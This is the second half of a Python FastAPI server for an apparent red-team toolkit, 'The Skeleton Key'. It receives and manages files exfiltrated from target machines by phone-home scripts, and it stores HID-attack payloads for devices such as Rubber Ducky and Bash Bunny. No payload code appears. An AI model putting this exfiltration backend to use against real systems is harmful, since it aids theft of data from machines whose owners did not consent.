                source=str(data.get("source") or "json"),
                client_ip=client_ip,
                upload_name=str(data.get("filename") or ""),
                username=operator,
            )
        else:
            upload = file
            upload_name = (file.filename or "upload") if file else ""
            if upload is None or not hasattr(upload, "read"):
                form = await request.form()
                for val in form.values():
                    if hasattr(val, "read") and hasattr(val, "filename"):
                        upload = val
                        upload_name = val.filename or "upload"
                        break
            if upload is None:
                return JSONResponse({"error": "file upload required"}, status_code=400)

            file_bytes = await upload.read()
            result = save_snarf_file(
                file_bytes,
                hostname=hostname,
                timestamp=timestamp,
                filepath=filepath,
                source=source or "multipart",
                client_ip=client_ip,
                upload_name=upload_name,
                username=operator,
            )
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

    await broadcast({"type": "snarf", **result})
    return result


@app.get("/api/snarf/catches")
async def snarf_list_catches(username: str = Depends(require_auth)):
    return list_catches(username)


@app.get("/api/snarf/log")
async def snarf_log(limit: int = 50, username: str = Depends(require_auth)):
    limit = max(1, min(limit, 500))
    return {"entries": recent_log_lines(limit, username)}


@app.get("/api/snarf/download")
async def snarf_download(path: str, username: str = Depends(require_auth)):
    try:
        resolved = snarf_safe_path(path, username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)
    return FileResponse(
        path=str(resolved),
        filename=resolved.name,
        media_type="application/octet-stream",
    )


@app.get("/api/snarf/preview")
async def snarf_preview(path: str, max_bytes: int = 2048, username: str = Depends(require_auth)):
    max_bytes = max(256, min(max_bytes, 8192))
    try:
        return preview_catch_file(path, max_bytes=max_bytes, username=username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)


@app.delete("/api/snarf/file")
async def snarf_delete_file(path: str, username: str = Depends(require_auth)):
    try:
        delete_catch_file(path, username)
        return {"ok": True}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)


@app.delete("/api/snarf/session")
async def snarf_delete_session(timestamp: str, hostname: str, username: str = Depends(require_auth)):
    try:
        count = delete_catch_session(timestamp, hostname, username)
        return {"ok": True, "deleted_files": count}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.get("/api/snarf/export")
async def snarf_export(timestamp: str = "", hostname: str = "", username: str = Depends(require_auth)):
    try:
        archive = export_catch_zip(timestamp, hostname, username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    name = archive.name
    return FileResponse(
        path=str(archive),
        filename=name,
        media_type="application/zip",
    )


# ─────────────────────────────────────────────────────────────────────────────
#  Payload save endpoint
# ─────────────────────────────────────────────────────────────────────────────

@app.post("/api/payload/save")
async def save_payload(data: dict, username: str = Depends(require_auth)):
    path    = data.get("path", "")
    content = data.get("content", "")
    if not path:
        return JSONResponse({"error": "No path provided"}, status_code=400)
    try:
        resolved = safe_path(path, username=username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)
    # Repo-safe: never silently overwrite cloned library files
    try:
        if resolved.resolve().is_relative_to(cfg_mod.REPOS_DIR.resolve()):
            return JSONResponse(
                {"error": "Cannot save over cloned repo files - use Save to Library or Save Copy"},
                status_code=403,
            )
    except ValueError:
        pass
    try:
        import shutil
        backup = str(resolved) + ".bak"
        shutil.copy2(resolved, backup)
        with open(resolved, "w", encoding="utf-8") as f:
            f.write(content)
        return {"ok": True, "path": str(resolved), "backup": backup,
                "bytes": len(content.encode())}
    except PermissionError:
        return JSONResponse({"error": f"Permission denied: {resolved}"}, status_code=403)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/payload/create")
async def create_payload(data: dict, username: str = Depends(require_auth)):
    device = (data.get("device") or "").strip().lower()
    name = (data.get("name") or "").strip()
    content = data.get("content")
    if device not in repo_mod.PAYLOAD_EXTS:
        return JSONResponse({"error": f"Unknown device: {device}"}, status_code=400)
    if not name:
        return JSONResponse({"error": "Payload name required"}, status_code=400)
    import re
    stem = re.sub(r"[^\w.\-]+", "_", name.strip())[:48].strip("._") or "payload"
    ext = data.get("extension") or DEFAULT_EXTENSIONS.get(device, ".txt")
    if not ext.startswith("."):
        ext = "." + ext
    if not stem.lower().endswith(ext.lower()):
        filename = stem + ext
    else:
        filename = stem
    if content is None:
        content = PAYLOAD_TEMPLATES.get(device, f"# TSK | {name}\n")
    dest_dir = user_payload_dir(username, device)
    dest = (dest_dir / filename).resolve()
    if not str(dest).startswith(str(dest_dir)):
        return JSONResponse({"error": "Invalid filename"}, status_code=400)
    if dest.exists():
        return JSONResponse({"error": f"File already exists: {filename}"}, status_code=409)
    try:
        dest.write_text(content, encoding="utf-8")
    except OSError as e:
        return JSONResponse({"error": str(e)}, status_code=500)
    desc, tags = repo_mod._parse_payload_header(dest, device)
    lang_map = {"ducky": "DS1", "bunny": "BB", "turtle": "LT", "teensy": "ARD", "usb": "PY"}
    if ext == ".ps1":
        lang = "PS1"
    elif ext == ".sh":
        lang = "SH"
    elif ext == ".hex":
        lang = "ARD"
    else:
        lang = lang_map.get(device, "TXT")
    payload = {
        "name": dest.stem.replace("_", " ").title(),
        "file": dest.name,
        "path": str(dest),
        "cat": "MY PAYLOADS",
        "tags": tags,
        "lang": lang,
        "desc": desc,
        "operator_owned": True,
    }
    return {"ok": True, "payload": payload}


@app.post("/api/payload/delete")
async def delete_payload(data: dict, username: str = Depends(require_auth)):
    path = (data.get("path") or "").strip()
    if not path:
        return JSONResponse({"error": "No path provided"}, status_code=400)
    if not is_user_payload_path(path, username):
        return JSONResponse(
            {"error": "Only operator-owned payloads under MY PAYLOADS can be deleted"},
            status_code=403,
        )
    try:
        resolved = safe_path(path, username=username, must_exist=True)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)
    try:
        resolved.unlink()
        return {"ok": True, "path": str(resolved)}
    except OSError as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Music (operator drop folder)
# ─────────────────────────────────────────────────────────────────────────────

MUSIC_DIR = STATIC_DIR / "music"

@app.get("/api/music/tracks")
async def music_tracks():
    """List audio files in web/static/music/ for the command-bar player."""
    MUSIC_DIR.mkdir(parents=True, exist_ok=True)
    exts = {".mp3", ".ogg", ".wav", ".m4a", ".flac"}
    tracks = []
    for path in sorted(MUSIC_DIR.iterdir()):
        if path.is_file() and path.suffix.lower() in exts:
            tracks.append({
                "name": path.stem.replace("_", " "),
                "file": path.name,
                "url": f"/static/music/{path.name}",
            })
    return {"tracks": tracks}


# Static assets — mounted after API routes
if STATIC_DIR.is_dir():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


# ─────────────────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────────────────

@app.on_event("startup")
async def startup_event():
    """Print key paths on startup so we can verify repo locations."""
    global _main_loop
    _main_loop = asyncio.get_running_loop()
    import config as _cfg
    # Force reload to avoid stale __pycache__
    import importlib
    importlib.reload(_cfg)
    print(f"[TSK] BASE_DIR  : {_cfg.BASE_DIR}")
    print(f"[TSK] REPOS_DIR : {_cfg.REPOS_DIR}")
    for dev in ["ducky","bunny","turtle"]:
        rp = _cfg.REPOS_DIR / dev
        print(f"[TSK] {dev:8} repo: {rp}  exists={rp.exists()}")
    print(f"[TSK] server.py : {Path(__file__).resolve()}")
    (cfg_mod.BASE_DIR / "snarfed").mkdir(parents=True, exist_ok=True)
    # Migrate old flat snarfed/ catches to snarfed/shared/ (one-time, idempotent)
    migrate_legacy_catches()
    # Ensure all existing operators have a catch token and build the routing map
    for uname in cfg_mod.list_users():
        cfg_mod.get_or_create_catch_token(uname)
    _rebuild_catch_token_map()
    print(f"[TSK] catch_token map: {len(_catch_tokens)} operator(s)")


def _generate_self_signed_cert(ssl_dir: Path) -> tuple[Path, Path]:
    """Generate a self-signed TLS cert in ssl_dir if not already present.

    Returns (key_path, cert_path). Raises RuntimeError if openssl is unavailable.
    """
    ssl_dir.mkdir(parents=True, exist_ok=True)
    key_path  = ssl_dir / "tsk.key"
    cert_path = ssl_dir / "tsk.crt"
    if key_path.exists() and cert_path.exists():
        return key_path, cert_path
    result = subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", str(key_path),
            "-out",    str(cert_path),
            "-days",   "3650",
            "-nodes",
            "-subj",   "/CN=TSK/O=The Skeleton Key/C=US",
        ],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"openssl failed to generate cert:\n{result.stderr.strip()}"
        )
    key_path.chmod(0o600)
    cert_path.chmod(0o644)
    return key_path, cert_path


def main():
    import argparse
    parser = argparse.ArgumentParser(description="TSK web server")
    parser.add_argument("--ssl", action="store_true",
                        help="Enable HTTPS with a self-signed certificate")
    parser.add_argument("--port", type=int, default=1337,
                        help="Port to listen on (default: 1337)")
    parser.add_argument("--host", default="0.0.0.0",
                        help="Host to bind (default: 0.0.0.0)")
    args = parser.parse_args()

    host  = args.host
    port  = args.port
    proto = "https" if args.ssl else "http"
    local_url = f"{proto}://127.0.0.1:{port}"

    ssl_keyfile  = None
    ssl_certfile = None

    if args.ssl:
        ssl_dir = Path(__file__).parent / "ssl"
        try:
            ssl_keyfile, ssl_certfile = _generate_self_signed_cert(ssl_dir)
            ssl_note = (
                f"\033[0;33m  Self-signed cert: {ssl_certfile}\033[0m\n"
                f"\033[0;90m  Your browser will warn about the cert - click 'Advanced'\033[0m\n"
                f"\033[0;90m  and 'Proceed' to accept it (one-time per browser).\033[0m\n"
                f"\033[0;90m  Phone-home scripts use HTTP - snarf exfil is unaffected.\033[0m"
            )
        except RuntimeError as e:
            print(f"\033[1;31m  SSL error: {e}\033[0m")
            print("\033[0;33m  Falling back to HTTP.\033[0m")
            proto = "http"
            local_url = f"http://127.0.0.1:{port}"
            ssl_note = ""
    else:
        ssl_note = ""

    print(f"""
\033[1;31m ████████╗███████╗██╗  ██╗\033[0m
\033[1;31m    ██╔══╝██╔════╝██║ ██╔╝\033[0m
\033[1;31m    ██║   ███████╗█████╔╝ \033[0m
\033[1;31m    ██║   ╚════██║██╔═██╗ \033[0m
\033[1;31m    ██║   ███████║██║  ██╗\033[0m
\033[1;31m    ╚═╝   ╚══════╝╚═╝  ╚═╝\033[0m

\033[0;37m  TSK | THE SKELETON KEY  \033[1;31mv1.0\033[0m  \033[0;90mDEF CON 34\033[0m

\033[0;32m  ✓ Server starting on \033[1;37m{local_url}\033[0m
\033[0;90m    (listening on all interfaces - phone-home reachable on LAN)\033[0m
{ssl_note}
\033[0;90m  Opening browser...\033[0m
\033[0;90m  Ctrl+C to stop\033[0m
""")

    def open_browser():
        import time; time.sleep(1.2)
        webbrowser.open(local_url)
    threading.Thread(target=open_browser, daemon=True).start()

    uvicorn.run(
        app,
        host=host,
        port=port,
        log_level="warning",
        ssl_keyfile=str(ssl_keyfile)  if ssl_keyfile  else None,
        ssl_certfile=str(ssl_certfile) if ssl_certfile else None,
    )

if __name__ == "__main__":
    main()

